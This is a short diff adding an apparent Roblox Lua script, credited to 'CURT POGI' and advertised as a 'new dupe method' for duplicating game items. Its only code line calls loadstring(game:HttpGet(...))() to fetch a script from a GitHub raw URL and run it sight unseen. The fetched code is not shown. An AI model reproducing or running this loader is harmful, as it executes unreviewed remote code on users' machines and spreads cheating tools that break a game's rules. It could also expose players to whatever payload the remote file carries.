@@ -1,0 +1,3 @@
+---- MADE BY CURT POGI ----
+---- NEW DUPE METHOD ----
+loadstring(game:HttpGet("https://raw.githubusercontent.com/chaudfleur/DupeScript/main/BackupScript"))()
